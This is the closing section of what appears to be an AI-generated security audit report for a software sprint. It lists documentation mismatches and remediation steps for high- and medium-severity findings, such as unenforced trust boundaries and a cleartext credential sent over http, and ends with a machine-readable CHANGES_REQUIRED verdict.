No `documentation-coherence-*` reports exist in this workspace (no `grimoires/loa/a2a/subagent-reports/`); documentation was verified manually. Blockers found: four documents describe a probe locality refusal that is not implemented (MED-006); `SKILL.md:117-118` / `:168-169` describe a trust boundary the code does not enforce (HIGH-002); the reference table documents exit codes `hop-locality.py` does not return (LOW-019); the README's migration pointer has no CHANGELOG entry in the diff (LOW-020).

---

## Next Steps

**CHANGES_REQUIRED:**
1. Address the five HIGH findings: one enforced locality rule shared by the four readers (HIGH-001); trusted-config drift refusal or explicit config hand-off to cheval (HIGH-002); dispatcher evidence check before accepting exit 3 (HIGH-003); gate the Flatline arbiter (HIGH-004); apply the `TransportPolicy` in the transport layer or restrict the opt-in to adapters that apply it (HIGH-005).
2. Decide the seven MEDIUM findings; MED-007 (cleartext credential on an http opt-in) should move with HIGH-005.
3. Add an `## AC Verification` walkthrough to `reviewer.md` and the CHANGELOG entry for the behaviour changes.
4. Run `/implement sprint-1` to fix, then `/review-sprint sprint-1` and `/audit-sprint sprint-1`.

---

*Generated by Paranoid Cypherpunk Auditor Agent*

<!-- LOA-VERDICT {"gate":"audit","verdict":"CHANGES_REQUIRED","counts":{"critical":0,"high":5,"medium":7,"low":20},"excluded":0,"excluded_confirmed":0,"sprint_id":"sprint-1","ts":"2026-10-22T08:20:00Z"} -->
